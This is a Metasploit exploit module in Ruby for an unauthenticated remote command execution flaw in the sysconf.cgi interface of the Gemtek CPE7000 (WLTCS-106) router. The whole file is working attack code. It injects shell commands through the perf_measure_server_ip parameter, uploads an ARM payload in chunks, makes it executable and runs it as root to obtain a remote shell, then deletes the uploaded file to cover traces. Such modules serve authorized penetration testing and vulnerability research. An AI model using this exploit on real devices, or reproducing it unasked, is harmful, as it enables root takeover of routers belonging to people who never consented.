# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Gemtek CPE7000 - WLTCS-106 sysconf.cgi Unauthenticated Remote Command Execution&#039;,
      &#039;Description&#039; => %q{
          A vulnerability exists for Gemtek CPE7000 model ID WLTCS-106
        exposing Iperf tool to unauthenticated users. Injecting a
        command in the perf_measure_server_ip parameter, an attacker
        can execute arbitrary commands. Since the service runs as root,
        the remote command execution has the same administrative privileges.
        The remote shell is obtained uploading the payload and executing it.
        won&#039;t allow (by default) incoming connections.
 
        Tested on Hardware version V02A and Firmware version 01.01.02.082.
      },
      &#039;Author&#039;      =>
        [
          &#039;Federico Scalco <fscalco [ at] mentat.is>&#039;
          #Based on the exploit by Federico Ramondino <framondino [at ] mentat.is>
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;EDB&#039;, &#039;39716&#039; ],
          [ &#039;URL&#039;, &#039;http://www.mentat.is/docs/cpe7000-multiple-vulns.html&#039; ],
          [ &#039;URL&#039; , &#039;http://www.gemtek.com.tw/&#039; ]
        ],
      &#039;DisclosureDate&#039; => &#039;Apr 07 2016&#039;,
      &#039;Privileged&#039;     => false,
      &#039;Platform&#039;       => %w{ linux },
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Linux arm Payload&#039;,
            {
            &#039;Arch&#039; => ARCH_ARMLE,
            &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DefaultOptions&#039; =>
      {
        &#039;RPORT&#039; => 443,
        &#039;SHELL&#039; => &#039;/bin/sh&#039;
      }
    ))
 
    register_options(
      [
        OptInt.new(&#039;CMD_DELAY&#039;, [false, &#039;Time that the Handler will wait for the incoming connection&#039;, 15]),
        OptInt.new(&#039;CHUNKS_DELAY&#039;, [false, &#039;Timeout between payload\&#039;s chunks sending requests&#039;, 2]),
        OptString.new(&#039;UPFILE&#039;, [ false, &#039;Payload filename on target server, (default: random)&#039; ]),
        OptInt.new(&#039;CHUNK_SIZE&#039;, [ false, &#039;Payload\&#039;s chunk size (in bytes, default: 50)&#039;, 50 ]),
        OptBool.new(&#039;SSL&#039;, [true, &#039;Use SSL&#039;, true])
      ], self.class)
 
  end
 
  def request_resource(resname)
    begin
      res = send_request_cgi({
        &#039;uri&#039;    => resname,
        &#039;method&#039; => &#039;GET&#039;,
      })
      return res
    rescue ::Rex::ConnectionError
      vprint_error("#{@rhost}:#{rport} - Failed to connect to the web server")
      return nil
    end
  end
 
  def cleanup
    print_status("#{@rhost}:#{rport} - Cleanup fase, trying to remove traces...")
 
    begin
      clean_target(@upfile)
    rescue
      vprint_error("#{@rhost}:#{rport} - Failed to clean traces (/www/#{@upfile}). The resource must be removed manually")
    end
    return
  end
 
  def clean_target(resname)
    res = request_resource(resname)
    if res and res.code != 404
      print_status("#{rhost}:#{rport} - Found resource " + resname + ". Cleaning up now")
      #remove
      cmd = &#039;"; rm /www/&#039; + resname +&#039; &> /dev/null #&#039;
      res = act(cmd, "deleting resource")
      if (!res)
        fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to delete resource /www/#{resname} (have to do it manually)")
      end
    end
  end
 
  def set_conditions(buffer)
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => &#039;/cgi-bin/sysconf.cgi&#039;,
    &#039;encode_params&#039; => true,
      &#039;vars_get&#039; => {
        &#039;page&#039; => &#039;ajax.asp&#039;,
        &#039;action&#039; => &#039;save_iperf_value&#039;,
        &#039;perf_measure_server_ip&#039; => buffer,
        &#039;perf_measure_server_port&#039; => &#039;5555&#039;,
        &#039;perf_measure_cpe_port&#039; => &#039;5554&#039;,
        &#039;perf_measure_test_time&#039; => &#039;60&#039;,
        &#039;perf_measure_protocol_type&#039; => &#039;1&#039;,
        &#039;perf_measure_packet_data_length&#039; => &#039;1024&#039;,
        &#039;perf_measure_bandwidth&#039; => &#039;19m&#039;,
        &#039;perf_measure_client_num&#039; => &#039;1&#039;
    }
    })
 
    if !res or res.code != 200
      fail_with(Failure::UnexpectedReply, "Server did not respond in an expected way to set_condition request")
    end
 
    return res
  end
 
  def toggle_once
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => &#039;/cgi-bin/sysconf.cgi&#039;,
      &#039;vars_get&#039; => {
        &#039;page&#039; => &#039;ajax.asp&#039;,
        &#039;action&#039; => &#039;perf_measure_status_toggle&#039;
    }
    })
 
    if !res or res.code != 200
      fail_with(Failure::UnexpectedReply, "Server did not respond in an expected way to toggle request")
    end
 
    if res.body == "1"
      @retoggled = false
      return true
    elsif !@retoggled
      #print_status("#{@rhost}:#{rport} - First toggle request returned 0, retoggling now...")
      @retoggled = true
      toggle_once()
    else
      fail_with(Failure::UnexpectedReply, "Toggler cgi did not respond in an expected way")
    end
 
  end
 
  def act(buffer, step)
    set_conditions(buffer)
    res = toggle_once()
    return res
  end
 
  def exploit
 
    @retoggled = false;
    @cmd_delay = datastore[&#039;CMD_DELAY&#039;] || 15
    @chunk_size = datastore[&#039;CHUNK_SIZE&#039;] || 50
    @rhost = datastore[&#039;RHOST&#039;]
    @rport = datastore[&#039;RPORT&#039;]
    @upfile = datastore[&#039;UPFILE&#039;] || rand_text_alpha(8+rand(8))
    chunk_delay = datastore[&#039;CHUNKS_DELAY&#039;] || 2
 
    clean_target(@upfile)
 
    pl = payload.encoded_exe
    chunks = pl.scan(/.{1,#{@chunk_size}}/)
    hash = Hash[chunks.map.with_index.to_a]
 
    print_status("Total payload chunks: " + chunks.length.to_s )
    print_status("#{rhost}:#{rport} - Uploading chunked payload on the gemtek device (/www/#{@upfile})")
 
    for chk in chunks
      chind = hash[chk]
      safe_buffer = chk.each_byte.map { |b| &#039;\x&#039; + b.to_s(16) }.join
 
      if chind == 0
        s_redir = &#039;>&#039;
      else
        s_redir = &#039;>>&#039;
      end
 
      cmd = &#039;"; printf \&#039;&#039; + safe_buffer + &#039;\&#039; &#039; + s_redir + &#039; /www/&#039; + @upfile + &#039; #&#039;
 
      print_status("#{@rhost}:#{rport} - Uploading chunk " + (chind + 1).to_s + "/" + chunks.length.to_s + (&#039;.&#039; * (chind + 1)))
      res = act(cmd, "uploading shell")
      if (!res)
       fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
      end
      select(nil, nil, nil, chunk_delay)
    end
 
    #chmod request
    cmd = &#039;"; chmod 777 /www/&#039; + @upfile + &#039; & #&#039;
    print_status("#{rhost}:#{rport} - Asking the gemtek device to chmod #{@upfile}")
    res = act(cmd, "chmodding payload")
    if (!res)
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to chmod payload")
    end
 
    select(nil, nil, nil, @cmd_delay)
 
    #phone home
    cmd = &#039;"; /www/&#039; + @upfile + &#039; & #&#039;
    print_status("#{rhost}:#{rport} - Asking the gemtek device to execute #{@upfile}")
    res = act(cmd, "executing payload")
    if (!res)
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
    end
 
    select(nil, nil, nil, @cmd_delay)
 
  end
end

